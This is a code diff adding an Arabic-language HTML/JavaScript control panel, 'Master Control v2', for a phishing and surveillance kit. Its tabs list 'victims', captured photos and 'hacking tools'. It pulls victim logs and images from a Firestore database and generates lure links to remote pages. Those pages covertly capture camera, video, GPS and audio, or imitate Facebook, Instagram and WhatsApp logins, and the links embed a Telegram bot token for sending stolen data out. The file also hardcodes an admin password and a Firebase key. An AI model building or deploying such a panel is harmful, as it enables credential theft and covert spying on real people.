@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>💀 Master Control v2</title>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root { --red: #ff0040; --gold: #ffaa00; --green: #00ff41; --dark: #0a0a0a; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Courier New',monospace; background:#000; color:#fff; min-height:100vh; padding:16px; }
+        
+        .nav { display:flex; gap:8px; margin-bottom:16px; flex-wrap:wrap; }
+        .nav-btn { flex:1; min-width:80px; padding:10px; background:var(--dark); border:1px solid #333; color:#fff; border-radius:8px; cursor:pointer; font-family:'Courier New',monospace; font-size:11px; text-align:center; }
+        .nav-btn.active { border-color:var(--red); color:var(--red); box-shadow:0 0 15px rgba(255,0,64,0.3); }
+        
+        .page { display:none; }
+        .page.active { display:block; }
+        
+        .card { background:var(--dark); border:1px solid #333; border-radius:12px; padding:16px; margin-bottom:12px; }
+        .card h2 { color:var(--gold); font-size:14px; margin-bottom:12px; }
+        
+        .log-item { background:#050000; border:1px solid #333; border-radius:8px; padding:12px; margin-bottom:8px; }
+        .log-item .time { color:#666; font-size:10px; }
+        .log-item .service { color:var(--red); font-size:12px; font-weight:bold; }
+        .log-item .data { color:#aaa; font-size:11px; margin-top:4px; }
+        
+        .gallery-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; }
+        .gallery-item { aspect-ratio:1; border-radius:8px; overflow:hidden; border:1px solid #333; cursor:pointer; }
+        .gallery-item img { width:100%; height:100%; object-fit:cover; }
+        
+        .stats-row { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; margin-bottom:16px; }
+        .stat-card { background:var(--dark); border:1px solid #333; border-radius:10px; padding:12px; text-align:center; }
+        .stat-card .num { color:var(--red); font-size:24px; font-weight:bold; }
+        .stat-card .txt { color:#666; font-size:10px; margin-top:4px; }
+        
+        .input-group { margin-bottom:12px; }
+        .input-group label { color:#888; font-size:11px; display:block; margin-bottom:4px; }
+        .input-group input { width:100%; padding:12px; background:#000; border:1px solid #333; border-radius:6px; color:#fff; font-size:13px; font-family:'Courier New',monospace; outline:none; }
+        .input-group input:focus { border-color:var(--red); }
+        
+        .btn { padding:10px 16px; border-radius:6px; border:none; cursor:pointer; font-family:'Courier New',monospace; font-weight:bold; font-size:12px; }
+        .btn-red { background:#2a0a0a; color:var(--red); border:1px solid var(--red); }
+        .btn-gold { background:#0a0a2a; color:var(--gold); border:1px solid var(--gold); }
+        
+        .tool-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+        .tool-card { background:var(--dark); border:1px solid #333; border-radius:10px; padding:14px; text-align:center; cursor:pointer; font-size:11px; }
+        .tool-card:active { border-color:var(--red); }
+        .tool-card .icon { font-size:30px; display:block; margin-bottom:6px; }
+        
+        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:999; justify-content:center; align-items:center; padding:20px; }
+        .modal.show { display:flex; }
+        .modal img { max-width:95%; max-height:85vh; border-radius:10px; }
+        .modal .close { position:absolute; top:20px; right:20px; color:#fff; font-size:30px; cursor:pointer; }
+        
+        .empty { text-align:center; color:#666; padding:40px; font-size:13px; }
+        
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+        .live-dot { display:inline-block; width:8px; height:8px; background:var(--green); border-radius:50%; animation:pulse 1s infinite; margin-left:4px; }
+    </style>
+</head>
+<body>
+
+<div class="nav">
+    <button class="nav-btn active" onclick="showTab('login')">🔐 دخول</button>
+    <button class="nav-btn" onclick="showTab('dashboard')">📊 لوحة</button>
+    <button class="nav-btn" onclick="showTab('tools')">🛠️ أدوات</button>
+    <button class="nav-btn" onclick="showTab('victims')">👥 الضحايا</button>
+    <button class="nav-btn" onclick="showTab('gallery')">📸 معرض</button>
+</div>
+
+<div class="page active" id="tab-login">
+    <div class="card">
+        <h2>🔐 تسجيل الدخول</h2>
+        <div class="input-group"><label>🤖 BOT TOKEN</label><input type="text" id="bot-token" placeholder="123456:ABC-DEF"></div>
+        <div class="input-group"><label>🆔 CHAT ID</label><input type="text" id="chat-id" placeholder="7276604783"></div>
+        <div class="input-group"><label>🔐 كلمة المرور</label><input type="password" id="admin-pass" placeholder="كلمة المرور"></div>
+        <button class="btn btn-red" onclick="login()" style="width:100%;padding:14px;font-size:15px;">💀 دخول</button>
+    </div>
+</div>
+
+<div class="page" id="tab-dashboard">
+    <div class="stats-row">
+        <div class="stat-card"><div class="num" id="stat-victims">0</div><div class="txt">ضحايا</div></div>
+        <div class="stat-card"><div class="num" id="stat-photos">0</div><div class="txt">صور</div></div>
+        <div class="stat-card"><div class="num" id="stat-today">0</div><div class="txt">اليوم</div></div>
+    </div>
+    <div class="card">
+        <h2>🕐 آخر النشاطات <span class="live-dot"></span></h2>
+        <div id="recent-logs"><div class="empty">⏳ جاري التحميل...</div></div>
+    </div>
+</div>
+
+<div class="page" id="tab-tools">
+    <div class="card">
+        <h2>🛠️ أدوات الاختراق</h2>
+        <div class="tool-grid" id="tools-grid"></div>
+    </div>
+</div>
+
+<div class="page" id="tab-victims">
+    <div class="card">
+        <h2>👥 سجل الضحايا</h2>
+        <div id="victims-list"><div class="empty">⏳ جاري التحميل...</div></div>
+    </div>
+</div>
+
+<div class="page" id="tab-gallery">
+    <div class="card">
+        <h2>📸 معرض الصور</h2>
+        <div class="gallery-grid" id="gallery-grid"><div class="empty">⏳ جاري التحميل...</div></div>
+    </div>
+</div>
+
+<div class="modal" id="modal" onclick="closeModal()">
+    <span class="close">✕</span>
+    <img id="modalImg" src="" alt="">
+</div>
+
+<script>
+var db;
+var loggedIn = false;
+var botToken = '';
+var chatId = '';
+var ADMIN_PASS = 'admin2024';
+var BASE = 'https://ai-proxy-eosin.vercel.app';
+var BASE2 = 'https://pubgskin.vercel.app';
+
+firebase.initializeApp({
+    apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
+    projectId: "game-a1aca",
+    storageBucket: "game-a1aca.firebasestorage.app",
+    appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
+});
+db = firebase.firestore();
+
+function showTab(tab) {
+    document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
+    document.querySelectorAll('.nav-btn').forEach(function(b) { b.classList.remove('active'); });
+    document.getElementById('tab-' + tab).classList.add('active');
+    document.querySelectorAll('.nav-btn').forEach(function(b) {
+        if (b.textContent.indexOf(getTabName(tab)) !== -1) b.classList.add('active');
+    });
+    
+    if (tab === 'dashboard') loadDashboard();
+    if (tab === 'victims') loadVictims();
+    if (tab === 'gallery') loadGallery();
+    if (tab === 'tools') loadTools();
+}
+
+function getTabName(tab) {
+    var names = {login:'دخول',dashboard:'لوحة',tools:'أدوات',victims:'الضحايا',gallery:'معرض'};
+    return names[tab] || '';
+}
+
+function login() {
+    var pass = document.getElementById('admin-pass').value;
+    botToken = document.getElementById('bot-token').value;
+    chatId = document.getElementById('chat-id').value;
+    
+    if (pass === ADMIN_PASS && botToken && chatId) {
+        loggedIn = true;
+        localStorage.setItem('mc2_token', botToken);
+        localStorage.setItem('mc2_chat', chatId);
+        showTab('dashboard');
+    } else {
+        alert('❌ بيانات خاطئة');
+    }
+}
+
+async function loadDashboard() {
+    try {
+        var snap = await db.collection('victims').orderBy('timestamp','desc').limit(10).get();
+        var totalVictims = 0;
+        var totalPhotos = 0;
+        var todayCount = 0;
+        var today = new Date().toDateString();
+        var html = '';
+        
+        snap.forEach(function(doc) {
+            var d = doc.data();
+            totalVictims++;
+            if (d.timestamp && new Date(d.timestamp).toDateString() === today) todayCount++;
+            
+            html += '<div class="log-item">';
+            html += '<div class="time">🕐 ' + (d.timestamp ? new Date(d.timestamp).toLocaleString('ar-EG') : '') + '</div>';
+            html += '<div class="service">' + (d.service || 'غير معروف') + '</div>';
+            html += '<div class="data">' + (d.data || '') + '</div>';
+            html += '</div>';
+        });
+        
+        var photoSnap = await db.collection('gallery').orderBy('timestamp','desc').limit(100).get();
+        photoSnap.forEach(function() { totalPhotos++; });
+        
+        document.getElementById('stat-victims').textContent = totalVictims;
+        document.getElementById('stat-photos').textContent = totalPhotos;
+        document.getElementById('stat-today').textContent = todayCount;
+        document.getElementById('recent-logs').innerHTML = html || '<div class="empty">لا توجد سجلات</div>';
+    } catch(e) {
+        document.getElementById('recent-logs').innerHTML = '<div class="empty">❌ فشل التحميل</div>';
+    }
+}
+
+async function loadVictims() {
+    try {
+        var snap = await db.collection('victims').orderBy('timestamp','desc').limit(50).get();
+        var html = '';
+        snap.forEach(function(doc) {
+            var d = doc.data();
+            html += '<div class="log-item">';
+            html += '<div class="time">🕐 ' + (d.timestamp ? new Date(d.timestamp).toLocaleString('ar-EG') : '') + '</div>';
+            html += '<div class="service">' + (d.service || 'غير معروف') + '</div>';
+            html += '<div class="data">' + (d.data || '') + '</div>';
+            html += '</div>';
+        });
+        document.getElementById('victims-list').innerHTML = html || '<div class="empty">لا يوجد ضحايا بعد</div>';
+    } catch(e) {
+        document.getElementById('victims-list').innerHTML = '<div class="empty">❌ فشل التحميل</div>';
+    }
+}
+
+async function loadGallery() {
+    try {
+        var snap = await db.collection('gallery').orderBy('timestamp','desc').limit(50).get();
+        var html = '';
+        snap.forEach(function(doc) {
+            var d = doc.data();
+            if (d.url) {
+                html += '<div class="gallery-item" onclick="openModal(\'' + d.url + '\')">';
+                html += '<img src="' + d.url + '" alt="" loading="lazy">';
+                html += '</div>';
+            }
+        });
+        document.getElementById('gallery-grid').innerHTML = html || '<div class="empty">📭 لا توجد صور</div>';
+    } catch(e) {
+        document.getElementById('gallery-grid').innerHTML = '<div class="empty">❌ فشل التحميل</div>';
+    }
+}
+
+function loadTools() {
+    var tools = [
+        {page:'photo-front.html',name:'كاميرا أمامية',icon:'📸'},
+        {page:'photo-back.html',name:'كاميرا خلفية',icon:'📷'},
+        {page:'mm.html',name:'فيديو أمامي',icon:'🎥'},
+        {page:'video-back.html',name:'فيديو خلفي',icon:'📹'},
+        {page:'location.html',name:'GPS',icon:'📍'},
+        {page:'audio.html',name:'صوت',icon:'🎙️'},
+        {page:'fb.html',name:'فيسبوك',icon:'📘'},
+        {page:'insta.html',name:'انستجرام',icon:'📷'},
+        {page:'whatsapp.html',name:'واتساب',icon:'💬'},
+        {page:'scan.html',name:'رفع صور',icon:'📁'},
+        {page:'live.html',name:'بث مباشر',icon:'🎥'}
+    ];
+    
+    var html = '';
+    tools.forEach(function(t) {
+        html += '<div class="tool-card" onclick="generateLink(\'' + t.page + '\')">';
+        html += '<span class="icon">' + t.icon + '</span>';
+        html += t.name;
+        html += '</div>';
+    });
+    document.getElementById('tools-grid').innerHTML = html;
+}
+
+function getBase(page) {
+    var mainPages = ['photo-front.html','photo-back.html','mm.html','video-back.html','location.html','audio.html','fb.html','insta.html','whatsapp.html'];
+    if (mainPages.indexOf(page) !== -1) return BASE;
+    return BASE2;
+}
+
+function generateLink(page) {
+    if (!loggedIn) return alert('سجل دخول الأول');
+    var link = getBase(page) + '/' + page + '?chatId=' + chatId + '&token=' + encodeURIComponent(botToken);
+    prompt('انسخ الرابط:', link);
+}
+
+function openModal(url) {
+    document.getElementById('modalImg').src = url;
+    document.getElementById('modal').classList.add('show');
+}
+
+function closeModal() {
+    document.getElementById('modal').classList.remove('show');
+}
+
+// استرجاع البيانات
+var savedToken = localStorage.getItem('mc2_token');
+var savedChat = localStorage.getItem('mc2_chat');
+if (savedToken && savedChat) {
+    botToken = savedToken;
+    chatId = savedChat;
+    loggedIn = true;
+    document.getElementById('bot-token').value = botToken;
+    document.getElementById('chat-id').value = chatId;
+    showTab('dashboard');
+}
+
+loadTools();
+</script>
+</body>
+</html>
